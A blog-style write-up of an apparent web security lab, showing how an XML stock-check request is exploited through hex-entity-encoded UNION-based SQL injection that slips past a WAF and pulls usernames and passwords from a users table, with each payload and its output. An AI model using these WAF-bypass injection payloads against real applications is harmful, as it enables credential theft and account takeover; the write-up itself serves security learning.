---
title: 
date: 
categories: 
tags: 
author: 
image:
  path: 
  alt: 
---
Introduction
SQL Injection (SQLi) vulnerabilities are common attack vectors where an attacker can manipulate the SQL queries executed by the server. These vulnerabilities can exist in various parts of an application, including forms that accept user input. However, attackers can also exploit SQLi through more obscure input vectors, such as XML or JSON-based requests.

In this blog, I’ll walk through an advanced XML-based SQL injection attack where I was able to bypass the application’s Web Application Firewall (WAF) and retrieve sensitive user credentials, such as usernames and passwords. The target application was vulnerable in its stock check feature, allowing me to perform a UNION-based SQLi attack.

Understanding XML-Based SQL Injection
Some web applications process input in different formats, including JSON and XML, which are then translated into SQL queries. This is significant because the typical SQL injection defenses (like those looking for certain keywords) can often miss attacks that use these alternative formats or encoding techniques.

In this lab, the stock check feature was vulnerable, allowing SQL injection via the XML input. The goal was to retrieve usernames and passwords stored in the database by injecting a malicious SQL query into the XML request.

Here’s how I approached and solved the lab.

Step-by-Step Solution
1. Identifying the Vulnerability
First, I identified that the application processed the stock check requests in XML format. The application’s response to these requests included information about available stock units for a given product and store. This gave me a potential injection point in the storeId field within the XML payload.

An example of the XML request looks like this:

<stockCheck>
    <productId>123</productId>
    <storeId>999</storeId>
</stockCheck>
My initial attempts to inject SQL queries into the storeId field were blocked by the WAF. The server returned an "Attack Detected" error, indicating that the application had some form of protection in place.

2. Bypassing WAF Using Hex Encoding
To bypass the WAF, I encoded the SQL injection payload using hex entities, which is a technique that can often slip past keyword-based defenses. Using the hex entity encoding for SQL keywords, I was able to execute my injection successfully. The payload looked like this:

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>3</productId>
    <storeId><@hex_entities>1 UNION SELECT NULL<@/hex_entities></storeId>
</stockCheck>
Analysis:
The response I received from the server indicated that the query was expecting only one column in the result. When I tried using two or more columns, the output didn’t match the expected format, confirming that the query returned just one column.

3. Retrieving Usernames
Next, I focused on retrieving data from the users table, which contained sensitive information such as usernames and passwords. Since the database schema was already known, I crafted a UNION-based SQL injection payload to retrieve the usernames first:

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>3</productId>
    <storeId><@hex_entities>1 UNION SELECT username FROM users<@/hex_entities></storeId>
</stockCheck>
Output received:

administrator
carlos
wiener
570 units
This confirmed that the username column was successfully extracted from the users table.

4. Retrieving Passwords
After extracting the usernames, I shifted my focus to retrieving the passwords. I adjusted the query to select the password column instead of username:

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>3</productId>
    <storeId><@hex_entities>1 UNION SELECT password FROM users<@/hex_entities></storeId>
</stockCheck>
Output received:

dummy_pass
dummy_pass_2
dummy_pass_3
570 units
The passwords for each user were successfully retrieved.

5. Combining Usernames and Passwords
To make the data more readable and usable, I combined the usernames and passwords into a single string using the SQL concatenation operator (||):

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>3</productId>
    <storeId><@hex_entities>1 UNION SELECT username || ':' || password FROM users<@/hex_entities></storeId>
</stockCheck>
Output received:

wiener:b5ztqjs9vgnc41ogbzrg
administrator:required_pass
carlos:5mkylldaeitoj88rjf7z
570 units
This gave me the usernames and their corresponding passwords in a clear format. After obtaining the passwords we have to login as administrator in order to solve the lab.

Conclusion
In this blog, we explored how SQL injection can be exploited even in cases where the input is in XML format, bypassing standard defenses such as Web Application Firewalls (WAFs). By using hex encoding for SQL keywords, I was able to execute a UNION-based SQL injection and retrieve sensitive data such as usernames and passwords.

This example underscores the importance of secure input handling across all data formats and the need for a robust defense-in-depth strategy to protect web applications from such attacks.

Key Takeaways:

SQL Injection vulnerabilities can exist in any controllable input, not just form fields.
Encoding SQL keywords (e.g., using hex entities) can bypass WAFs or other security mechanisms.
It’s essential to secure all inputs, including XML and JSON, against SQL injection.
Stay tuned for more insights and walkthroughs as I learn more on web application security and Cyber Security!
